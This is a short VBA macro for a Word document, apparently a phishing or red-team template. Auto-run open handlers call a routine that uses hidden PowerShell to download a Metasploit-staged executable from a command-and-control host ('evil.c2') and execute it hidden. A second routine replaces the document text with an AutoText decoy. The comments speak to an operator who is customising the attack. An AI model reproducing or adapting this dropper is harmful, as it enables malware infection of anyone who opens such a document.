' Excel macros need a separate WorkbookOpen() but similar	
Sub Document_Open()
 evil
 awfsec
End Sub
	
Sub AutoOpen()
 evil
 awfsec
End Sub
	
Sub awfsec()
  ActiveDocument.Content.Select 
  Selection.Delete
    ' NOTE: this has the autotext replacement entry.
  ActiveDocument.AttachedTemplate.AutoTextEntries("JALAPENO").Insert Where:=Selection.Range, RichText:=True
End Sub
	
Sub evil()
  Dim str As String
  Dim path As String
    ' change to just a download cradle if that's your thing.
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.c2:8080/msf-staged.exe', '" & ActiveDocument.path & "\msfstaged.exe')"
	Shell str, vbHide
	Dim exePath As String
	exePath = ActiveDocument.path + "\msfstaged.exe"
	Wait 3
	Shell exePath, vbHide
End Sub
	
Sub Wait(n As Long)
	Dim t As Date
	t = Now
	Do
	  DoEvents
	Loop Until Now >= DateAdd("s", n, t)
End Sub
